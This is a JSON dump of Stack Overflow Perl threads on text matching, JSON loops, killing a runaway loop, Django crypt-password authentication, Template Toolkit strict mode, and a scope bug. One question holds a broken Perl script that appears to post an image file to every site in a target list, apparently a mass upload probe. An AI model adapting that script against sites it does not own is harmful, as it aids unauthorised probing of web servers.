"https://lh4.googleusercontent.com/-wEdE_ERIePM/AAAAAAAAAAI/AAAAAAAAJGQ/k2ceucupQb4/photo.jpg?sz=128", "display_name": "ary", "link": "https://stackoverflow.com/users/7700359/ary"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 99, "favorite_count": 0, "accepted_answer_id": 44361482, "answer_count": 1, "score": 0, "last_activity_date": 1497371290, "creation_date": 1496633155, "last_edit_date": 1497371262, "question_id": 44361259, "link": "https://stackoverflow.com/questions/44361259/perl-code-to-find-an-array-element-in-a-sentence-and-then-to-look-either-side-of", "title": "Perl code to find an array element in a sentence and then to look either side of the match for another string to be matched from a different array", "body": "<p>I have 2 arrays in which one of the array consists of words which I consider as trigger words while the second array is a list of names. I want to find sentences in a file which have the trigger word and then look both right and left and find the matches using the array name. </p>\n\n<p>I am kind of confused about how to go about solving this problem.</p>\n\n<pre><code>my @strings = (\n    'SPARC is an activator of SPARCL1.',\n    'SPARCL1 and SPARC regulate the expression of TGFB1.',\n    'SPARCL1 and SPARC are used in signal transduction.',\n    'SPARCL1 and ADAMTS4 have been found to upregulated by MMP3 and MMP3 are downregulated by SMAD3.',\n);\n\nmy @trigs = ( \"activator\", \"regulate\", \"upregulated\" , \"downregulated\" );\nmy @genes = ( \"SPARC\", \"SPARCL1\", \"ADAMTS4\", \"MMP3\", \"SMAD3\", \"TGFB1\" );\n</code></pre>\n\n<p>Desired output:</p>\n\n<pre><code>SPARC is an activator of SPARCL1\nSPARC regulate the expression of TGFB1\nADAMTS4 have been found to upregulated by MMP3\nMMP3 are downregulated by SMAD3\n</code></pre>\n"}, {"tags": ["json", "perl"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1496633930, "post_id": 44361120, "comment_id": 75724394, "body": "Re &quot;<i>It loads properly</i>&quot;, I doubt that. That&#39;s not valid JSON. (trailing comma)."}], "answers": [{"comments": [{"owner": {"reputation": 313, "user_id": 2115947, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e4cfe5ffb612bd34ba32f1bb521495f6?s=128&d=identicon&r=PG", "display_name": "David Villasmil", "link": "https://stackoverflow.com/users/2115947/david-villasmil"}, "edited": false, "score": 0, "creation_date": 1496636671, "post_id": 44361326, "comment_id": 75724983, "body": "Thanks, I had already figured it out, but didn&#39;t report it. Usign &quot;foreach my $env( keys %{$ret} )&quot;"}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 2, "last_activity_date": 1496637355, "last_edit_date": 1496637355, "creation_date": 1496633831, "answer_id": 44361326, "question_id": 44361120, "link": "https://stackoverflow.com/questions/44361120/perl-load-json-from-file-and-loop/44361326#44361326", "title": "perl load json from file and loop", "body": "<p>There's no array in that JSON. </p>\n\n<pre><code>for my $env_name (keys(%$ret)) {\n   my $env = $ret-&gt;{$env_name};\n\n   ... $env-&gt;{data} ...\n\n}\n</code></pre>\n"}], "owner": {"reputation": 313, "user_id": 2115947, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e4cfe5ffb612bd34ba32f1bb521495f6?s=128&d=identicon&r=PG", "display_name": "David Villasmil", "link": "https://stackoverflow.com/users/2115947/david-villasmil"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 997, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1496637355, "creation_date": 1496631837, "question_id": 44361120, "link": "https://stackoverflow.com/questions/44361120/perl-load-json-from-file-and-loop", "title": "perl load json from file and loop", "body": "<p>I've got a file like this:</p>\n\n<pre><code>{\n    \"dev\":\n    {\n        \"data\": \"1\"\n    },\n    \"stg\":\n    {\n        \"data\": \"1\"\n    },\n    \"pre\":\n    {\n        \"data\": \"1\"\n    },\n    \"prod\":\n    {\n        \"data\": \"1\"\n    },\n}\n</code></pre>\n\n<p>I load the json like this:</p>\n\n<pre><code>open(FH,\"&lt;\",$file) or die \"environments.json file doesn't exists!\\n\";\nmy $data = &lt;FH&gt;;\n\nmy $ret = JSON::decode_json( $data );\n</code></pre>\n\n<p>It loads properly, I can do:</p>\n\n<pre><code>print \"Dumper: \" .  Dumper($ret) . \"\\n\";\n</code></pre>\n\n<p>But when I try to loop through it with:</p>\n\n<pre><code>foreach my $env( @$ret )\n{\n    print \"Environment: \" . $env-&gt;{\"data\"} . \"\\n\";\n}\n</code></pre>\n\n<p>I get:</p>\n\n<pre><code>Not an ARRAY reference at ./launcher.pl line 20, &lt;FH&gt; line 1.\n</code></pre>\n\n<p>On the <code>foreach my $env( @$ret )</code> line\nHelp is appreciated!</p>\n\n<p>Thanks!</p>\n\n<p>David</p>\n"}, {"tags": ["linux", "perl"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1496621753, "post_id": 44359827, "comment_id": 75722021, "body": "Can you reboot the machine?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 3, "creation_date": 1496622727, "post_id": 44359827, "comment_id": 75722245, "body": "Your bash process (or whatever shell you&#39;re using) is still running after you kill the Perl processes that it&#39;s starting. Find that and kill it instead."}, {"owner": {"reputation": 80303, "user_id": 196561, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/6836267883ea7234253b2100f222dbbc?s=128&d=identicon&r=PG", "display_name": "osgx", "link": "https://stackoverflow.com/users/196561/osgx"}, "edited": false, "score": 3, "creation_date": 1496622994, "post_id": 44359827, "comment_id": 75722310, "body": "And to stop the loop while searching for this bash, try <code>kill -STOP `pidof perl`</code> - it will pause (every) perl process until <code>-CONT</code> signal is sent to it."}], "answers": [{"comments": [{"owner": {"reputation": 447, "user_id": 2896215, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/197d27a820d10c716a4cdc2c024d3c9a?s=128&d=identicon&r=PG&f=1", "display_name": "user2896215", "link": "https://stackoverflow.com/users/2896215/user2896215"}, "edited": false, "score": 0, "creation_date": 1496693171, "post_id": 44360155, "comment_id": 75754604, "body": "Thanks. I was able to kill it."}], "tags": [], "owner": {"reputation": 3364, "user_id": 693294, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8d5935d56f077497b60c12cf86b9d2e1?s=128&d=identicon&r=PG", "display_name": "Gilbert", "link": "https://stackoverflow.com/users/693294/gilbert"}, "is_accepted": true, "score": 2, "last_activity_date": 1496626481, "last_edit_date": 1496626481, "creation_date": 1496622212, "answer_id": 44360155, "question_id": 44359827, "link": "https://stackoverflow.com/questions/44359827/how-to-terminate-a-background-while-loop-in-linux/44360155#44360155", "title": "How to terminate a background while loop in Linux?", "body": "<p>What may be happening is that you are killing the perl program, but the loop throwing them off is still running. You need to kill the entire login tree.</p>\n\n<p><b>ps -f -u$USER</b> (or something like it, depends on the OS) shows the process id, parent process id, and tty of your processes. </p>\n\n<p>Kill the process and the parent, all the way up the process tree to your unwanted shell running the loop. Notice the tty of the offending process... if different from your current tty kill all processes on that tty; you may need a new terminal window to get a different tty.</p>\n\n<p>Alternate: Linux has <b>ps xjf</b> to show the processes in tree format... start with the relevant shell process and kill that and all child processes. </p>\n\n<p>Extra info: processes that don't go away under kill -9, keeping the same PID (not your condition), are likely \"zombie\" processes that are waiting for their parent to read their exit status. Zombies have actually stopped and gone away and are not alive so you can't kill them. Only a ghost remains in the process table waiting for the parent to read the pending exit status. Killing the parent will reassign the process to <b>init</b>, which will read the status. </p>\n"}, {"tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 0, "last_activity_date": 1496651678, "creation_date": 1496651678, "answer_id": 44364887, "question_id": 44359827, "link": "https://stackoverflow.com/questions/44359827/how-to-terminate-a-background-while-loop-in-linux/44364887#44364887", "title": "How to terminate a background while loop in Linux?", "body": "<p><code>ps -ef</code> tells you two numbers. The process id, and the <em>parent</em> process id.</p>\n\n<p>Kill the latter, and you'll kill the thing spawning your perl processes. </p>\n\n<p>alternatively - <code>kill -1 -1</code>  will kill all your processes (don't do this as root!). </p>\n"}], "owner": {"reputation": 447, "user_id": 2896215, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/197d27a820d10c716a4cdc2c024d3c9a?s=128&d=identicon&r=PG&f=1", "display_name": "user2896215", "link": "https://stackoverflow.com/users/2896215/user2896215"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 677, "favorite_count": 1, "accepted_answer_id": 44360155, "answer_count": 2, "score": -1, "last_activity_date": 1496651678, "creation_date": 1496618991, "last_edit_date": 1496622513, "question_id": 44359827, "link": "https://stackoverflow.com/questions/44359827/how-to-terminate-a-background-while-loop-in-linux", "title": "How to terminate a background while loop in Linux?", "body": "<p>I cannot find a way to terminate a background <code>while</code> loop.</p>\n\n<p>I started a Perl script in an infinite while loop (i.e. <code>while true; do perl abc.pl; done</code>) and my terminal session got disconnected.</p>\n\n<p>Now I am trying to terminate that loop.</p>\n\n<p>If I do <code>ps -aux | grep perl</code>, I see that a Perl script is running.</p>\n\n<p>If I do <code>kill -9 &lt;process id&gt;</code>, it keeps showing up with different process IDs.</p>\n\n<p>How can I terminate it for good?</p>\n\n<p>The only work around I have found is to rename my script, and then it stops.</p>\n"}, {"tags": ["python", "django", "perl"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496596956, "post_id": 44356774, "comment_id": 75715602, "body": "Your approach sounds reasonable. If you cannot get them out again, do that. You can also add a marker to remember which passwords are old, then upgrade the passwords one by one when users log in and use a more modern hashing algorithm."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 17619, "user_id": 7818749, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ec4a72453e116debb802d55e88c2572e?s=128&d=identicon&r=PG&f=1", "display_name": "Gerhard", "link": "https://stackoverflow.com/users/7818749/gerhard"}, "edited": false, "score": 0, "creation_date": 1496597046, "post_id": 44356774, "comment_id": 75715645, "body": "@GerhardBarnard the very old code is not relevant to the question. They are not asking how to translate it. This question is about the process, which is a little bit off-topic I believe. Maybe it&#39;s better suited for <a href=\"https://softwareengineering.stackexchange.com\">Software Engineering</a>, though I am usually wrong when suggesting that because I don&#39;t frequent that site. The second part <i>how can this be implemented</i> is definitely off-topic because we&#39;re not a code-writing service."}, {"owner": {"reputation": 879, "user_id": 2125853, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/f2d86fa6a8fe8ec67ef80170f1b35505?s=128&d=identicon&r=PG", "display_name": "user2125853", "link": "https://stackoverflow.com/users/2125853/user2125853"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496598610, "post_id": 44356774, "comment_id": 75716149, "body": "@simbabque I did think of upgrading the passwords once I got them to work the first time around. The &#39;how&#39; part is Django specific.  Like is there a method I need to override? I have a reference here that I can look at.  Thanks"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1496603004, "post_id": 44356774, "comment_id": 75717548, "body": "@user2125853: <i>&quot;Do I have a better option?&quot;</i> What would you consider to be &quot;better&quot;. What is wrong with the solution that you have proposed? As <b>simbabque</b> says, this is rather off topic as you don&#39;t have a programming problem except in a very broad sense. Without a copy of the original passwords, you can&#39;t silently &quot;upgrade&quot; them."}, {"owner": {"reputation": 879, "user_id": 2125853, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/f2d86fa6a8fe8ec67ef80170f1b35505?s=128&d=identicon&r=PG", "display_name": "user2125853", "link": "https://stackoverflow.com/users/2125853/user2125853"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1496616063, "post_id": 44356774, "comment_id": 75720830, "body": "@Borodin I was not asking for an option in broad sense.  I am not too familiar with Django.  What I was looking for if Django had an option (e.g using the existing user table instead of auth_user).  I do appreciate the insight provided here."}], "answers": [{"comments": [{"owner": {"reputation": 879, "user_id": 2125853, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/f2d86fa6a8fe8ec67ef80170f1b35505?s=128&d=identicon&r=PG", "display_name": "user2125853", "link": "https://stackoverflow.com/users/2125853/user2125853"}, "edited": false, "score": 0, "creation_date": 1496616161, "post_id": 44358664, "comment_id": 75720857, "body": "Thank you.  This is very helpful."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1496622033, "post_id": 44358664, "comment_id": 75722081, "body": "Excellent. Thank you"}], "tags": [], "owner": {"reputation": 2576, "user_id": 2836656, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa477f06ae4b66d1d762a5c1f2f09674?s=128&d=identicon&r=PG&f=1", "display_name": "clockwatcher", "link": "https://stackoverflow.com/users/2836656/clockwatcher"}, "is_accepted": true, "score": 3, "last_activity_date": 1496621996, "last_edit_date": 1496621996, "creation_date": 1496609557, "answer_id": 44358664, "question_id": 44356774, "link": "https://stackoverflow.com/questions/44356774/using-django-authentication-system-with-existing-hashed-passwords/44358664#44358664", "title": "Using Django authentication system with existing hashed passwords", "body": "<p>The documentation for writing up a custom authentication backend are in\n<a href=\"https://docs.djangoproject.com/en/1.11/topics/auth/customizing/\" rel=\"nofollow noreferrer\"><em>Customizing authentication in Django</em></a></p>\n\n<p>Since Borodin asked and since you might find it handy to have a sample more specific to your request, I went ahead and wrote up an example  that authenticates against a <code>crypt</code>-based file (e.g., <code>htpasswd</code>).</p>\n\n<p>If the backend finds a user with a matching password in the <code>crypt</code> file, it looks for a standard Django user and returns it.  If it can't find one it creates one.  Obviously you would need to decide how you want to handle the actual details of your implementation.</p>\n\n<h3>./authbackend/__init__.py</h3>\n\n<pre><code>import crypt\nfrom django.conf import settings\nfrom django.contrib.auth.models import User\n\nclass CryptBackend(object):\n    def authenticate(self, request, username=None, password=None):\n        crypt_file = getattr(settings, \"CRYPT_DB\", None)\n        if crypt_file is None:\n            return None\n\n        password_match = False\n        with open(crypt_file,\"r\") as f:\n            for line in f:\n                (user, crypted_pass) = line.rstrip().split(\":\")\n                if user == username:\n                    password_match = crypt.crypt(password, crypted_pass) == crypted_pass\n                    break\n\n        if not password_match:\n            return None\n\n        # found a match in our crypt database\n        try:\n            django_user = User.objects.get(username=username)\n        except User.DoesNotExist:\n            django_user = User.objects.create_user(username=username, email='', password=password)\n            django_user.is_staff = True\n            django_user.save()\n\n        return django_user\n\n    def get_user(self, user_id):\n        try:\n            return User.objects.get(pk=user_id)\n        except User.DoesNotExist:\n            return None\n</code></pre>\n\n<p>That new custom backend is loaded based on additions to <code>settings.py</code>.  In my example, I'm keeping the default Django backend and simply adding my new custom one. Django checks them in order, so it will try a standard Django authentication and if that doesn't work moves on to my custom one. The <code>CRYPT_DB</code> parameter is the path to the <code>htpasswd</code> file.</p>\n\n<h3>settings.py</h3>\n\n<pre><code>AUTHENTICATION_BACKENDS = [\n    'django.contrib.auth.backends.ModelBackend',\n    'authbackend.CryptBackend',\n]\n\nCRYPT_DB = '/path/to/your/passwd.file'\n</code></pre>\n\n<p>And for completeness, an example of the format (<code>htpasswd</code>) that the above is  checking against.</p>\n\n<h3>passwd.file</h3>\n\n<pre><code>jill:C.1oP2DOot4MY\njack:qJn7lPS/VNssM\n</code></pre>\n"}], "owner": {"reputation": 879, "user_id": 2125853, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/f2d86fa6a8fe8ec67ef80170f1b35505?s=128&d=identicon&r=PG", "display_name": "user2125853", "link": "https://stackoverflow.com/users/2125853/user2125853"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 299, "favorite_count": 0, "accepted_answer_id": 44358664, "answer_count": 1, "score": 0, "last_activity_date": 1496621996, "creation_date": 1496596546, "last_edit_date": 1496602685, "question_id": 44356774, "link": "https://stackoverflow.com/questions/44356774/using-django-authentication-system-with-existing-hashed-passwords", "title": "Using Django authentication system with existing hashed passwords", "body": "<p>I have a very old Perl CGI system with a table of users. The passwords are stored as computed hashes using the  <code>crypt</code> function. I am looking to migrate the system to Django, and I would like to keep the user data while using the Django table structure. </p>\n\n<p>One option would be to copy all the user/password data an <code>auth_user</code> table and use a custom authentication function since I have existing password hashes.</p>\n\n<p>Do I have a better option?</p>\n\n<p>If I go with this option then how can it be implemented?</p>\n"}, {"tags": ["perl"], "answers": [{"comments": [{"owner": {"reputation": 4644, "user_id": 1431720, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/f5a1388d4d3b2bf03b11bb5658c68c29?s=128&d=identicon&r=PG", "display_name": "Robert", "link": "https://stackoverflow.com/users/1431720/robert"}, "edited": false, "score": 0, "creation_date": 1496538178, "post_id": 44349736, "comment_id": 75702096, "body": "Great, thanks, I hoped there was a shorter way but this works and the default does not get placed in the actual hash on the Perl side (no side effect)."}, {"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "reply_to_user": {"reputation": 4644, "user_id": 1431720, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/f5a1388d4d3b2bf03b11bb5658c68c29?s=128&d=identicon&r=PG", "display_name": "Robert", "link": "https://stackoverflow.com/users/1431720/robert"}, "edited": false, "score": 1, "creation_date": 1496560069, "post_id": 44349736, "comment_id": 75705343, "body": "Personally, I would <i>highly</i> recommend doing your variable vetting within the code itself. The template shouldn&#39;t have to do its own error management. Things should be pristine being sent to the template, so write something in Perl that verifies that all template variables are satisfied. Template checking like this could cause issues; don&#39;t blame the paperwork if you&#39;ve signed it blindly"}, {"owner": {"reputation": 4644, "user_id": 1431720, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/f5a1388d4d3b2bf03b11bb5658c68c29?s=128&d=identicon&r=PG", "display_name": "Robert", "link": "https://stackoverflow.com/users/1431720/robert"}, "edited": false, "score": 0, "creation_date": 1496591799, "post_id": 44349736, "comment_id": 75713893, "body": "Agreed, especially cause I can write unit tests for anything in Perl much easier than for the templates. My situation was with optional data in a domain object. I did not want to duplicate them to variables for the template, and I did not want to enter dummy values for optional data."}], "tags": [], "owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "is_accepted": true, "score": 4, "last_activity_date": 1496560170, "last_edit_date": 1496560170, "creation_date": 1496535948, "answer_id": 44349736, "question_id": 44349405, "link": "https://stackoverflow.com/questions/44349405/perl-template-with-strict-option-how-to-check-whether-a-variable-is-defined/44349736#44349736", "title": "Perl Template with strict option: how to check whether a variable is defined?", "body": "<p>You are sending in an empty hash reference that doesn't contain the <code>var</code> variable that you're asking the template to display.</p>\n\n<p>You can either check in your Perl code to set a sane default (in this example, I just hard-code it into the call to <code>process()</code>):</p>\n\n<pre><code>$t-&gt;process(\\$template, {var =&gt; 55}, $output) || die $t-&gt;error(), \"\\n\";\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>55\n</code></pre>\n\n<p>...or, you can tell the template to set its own sane default if the <code>var</code> variable isn't sent on the way in (ie, it's undefined):</p>\n\n<pre><code>my $template = '[% DEFAULT var = \"sane\" %][% IF var %][% var %][% END%]';\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>sane\n</code></pre>\n"}], "owner": {"reputation": 4644, "user_id": 1431720, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/f5a1388d4d3b2bf03b11bb5658c68c29?s=128&d=identicon&r=PG", "display_name": "Robert", "link": "https://stackoverflow.com/users/1431720/robert"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 213, "favorite_count": 0, "accepted_answer_id": 44349736, "answer_count": 1, "score": 3, "last_activity_date": 1496560170, "creation_date": 1496532213, "question_id": 44349405, "link": "https://stackoverflow.com/questions/44349405/perl-template-with-strict-option-how-to-check-whether-a-variable-is-defined", "title": "Perl Template with strict option: how to check whether a variable is defined?", "body": "<p>The following code dies with a var.undef error because <code>var</code> is not defined. It works if I change the <code>STRICT</code> option to 0, but I'd like to keep strict checks, unless it's in an <code>[% IF var %]</code> check in the template. How do I do that?</p>\n\n<pre><code>use strict;\nuse warnings;\nuse Template;\n\nmy $t = Template-&gt;new(STRICT =&gt; 1) || die Template-&gt;error();\nmy $template = '[% IF var %][% var %][% END%]';\nmy $output = '';\n$t-&gt;process(\\$template, {}, \\$output) || die $t-&gt;error(), \"\\n\";\nprint \"$output\\n\";\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1496529562, "post_id": 44348753, "comment_id": 75700762, "body": "The code you posted doesn&#39;t have 35 lines. Please provide the code that actually provided the error."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1496529592, "post_id": 44348753, "comment_id": 75700771, "body": "<code>my $site</code> creates a new scalar initialized to <code>undef</code>. You assign this scalar to <code>$url</code>, setting it to <code>undef</code> as well. You then use <code>$url</code> as if it contains a url, but it doesn&#39;t."}, {"owner": {"reputation": 17619, "user_id": 7818749, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ec4a72453e116debb802d55e88c2572e?s=128&d=identicon&r=PG&f=1", "display_name": "Gerhard", "link": "https://stackoverflow.com/users/7818749/gerhard"}, "edited": false, "score": 0, "creation_date": 1496642577, "post_id": 44348753, "comment_id": 75726735, "body": "You are re-declaring <code>$site</code> with the foreach. The for loop only does a chomp of <code>$site</code> and that is it. <code>%args</code> is declared, but not use, <code>$buf</code> <code>$buf_ref</code> etc. A lot wrong with this code."}], "answers": [{"comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1496601963, "post_id": 44349793, "comment_id": 75717251, "body": "Your explanation of the problem is good, but your proposed solution doesn&#39;t work. Did you try it? And why do you think the loop only iterates once?"}, {"owner": {"reputation": 464, "user_id": 3342248, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8a8e382bd13ffcf46be4229173acd485?s=128&d=identicon&r=PG&f=1", "display_name": "SGeorgiades", "link": "https://stackoverflow.com/users/3342248/sgeorgiades"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1496728193, "post_id": 44349793, "comment_id": 75764655, "body": "You are right, @melpomene... I misread the original code and thought only one value was being read in for TARGET.  I&#39;ve corrected my response now"}], "tags": [], "owner": {"reputation": 464, "user_id": 3342248, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8a8e382bd13ffcf46be4229173acd485?s=128&d=identicon&r=PG&f=1", "display_name": "SGeorgiades", "link": "https://stackoverflow.com/users/3342248/sgeorgiades"}, "is_accepted": false, "score": -1, "last_activity_date": 1496728412, "last_edit_date": 1496728412, "creation_date": 1496536928, "answer_id": 44349793, "question_id": 44348753, "link": "https://stackoverflow.com/questions/44348753/use-of-uninitialized-value-site-in-string/44349793#44349793", "title": "Use of uninitialized value $site in string", "body": "<p>I think what you are expecting is the value of $site to carry over from the for loop, but because it is defined <em>in</em> the for loop, its scope is limited to that loop.  Perhaps what you intended is for all of the following code to also be inside that loop.  Otherwise, that value for $site ceases to exist at the closing-brace two lines after it was created.  Your line</p>\n\n<pre><code>my $url = my $site;\n</code></pre>\n\n<p>then creates a <em>new</em> variable $site (which is undef), and that undef value is used to set $url, so it is also undef.  I suspect you initially had</p>\n\n<pre><code>my $url = $site;\n</code></pre>\n\n<p>then added the extra \"my\" to resolve an earlier error.</p>\n\n<p>I hope this helps you.</p>\n"}], "owner": {"reputation": 1, "user_id": 8106929, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/492f400afbea5fe6edc80786ee9de2ac?s=128&d=identicon&r=PG&f=1", "display_name": "bggfvbbg", "link": "https://stackoverflow.com/users/8106929/bggfvbbg"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 266, "favorite_count": 1, "answer_count": 1, "score": -2, "last_activity_date": 1496728412, "creation_date": 1496525602, "last_edit_date": 1496529425, "question_id": 44348753, "link": "https://stackoverflow.com/questions/44348753/use-of-uninitialized-value-site-in-string", "title": "Use of uninitialized value $site in string", "body": "<p>'m trying to execute this code but it's already give me the following error :<br>\n<strong>Use of uninitialized value $site in string at C:\\Users\\USER\\Desktop\\script.pl line 35.</strong></p>\n\n<pre><code>#!/usr/bin/perl\n\nuse LWP::UserAgent;\nuse File::Slurp;\nuse warnings;\nuse strict;\nuse HTTP::Request;\n\nopen (THETARGET, \"&lt;list.txt\") || die \"[-] Can't open the file\";\nmy @TARGETS = &lt;THETARGET&gt;;\nclose THETARGET;\nmy $link=$#TARGETS + 1;\n\nOUTER: foreach my $site(@TARGETS){\n    chomp($site);\n}\n\nmy $ua = LWP::UserAgent-&gt;new;\n$ua-&gt;timeout(10);\nmy $url = my $site;\nmy $picture = \"teest.png\";\nmy %args;\nmy $field_name = \"file[]\";\nmy $buf ;\nmy $buf_ref = $args{'buf'} || \\$buf ;\n\n\nmy $value = read_file( $picture , binmode =&gt; ':raw' , scalar_ref =&gt; 1 );\n\nmy $response = $ua-&gt;post( $url,\n            Content_Type =&gt; 'form-data',\n            Content =&gt; [ $field_name =&gt; [\"$picture\"] ]\n            );\nprint \"$site\";\n</code></pre>\n"}, {"tags": ["perl", "arrayref"], "comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 2, "creation_date": 1496521423, "post_id": 44348179, "comment_id": 75698906, "body": "There is no <code>for</code> loop in your sub. If you had used <code>use strict; use warnings;</code>, perl would&#39;ve told you."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": 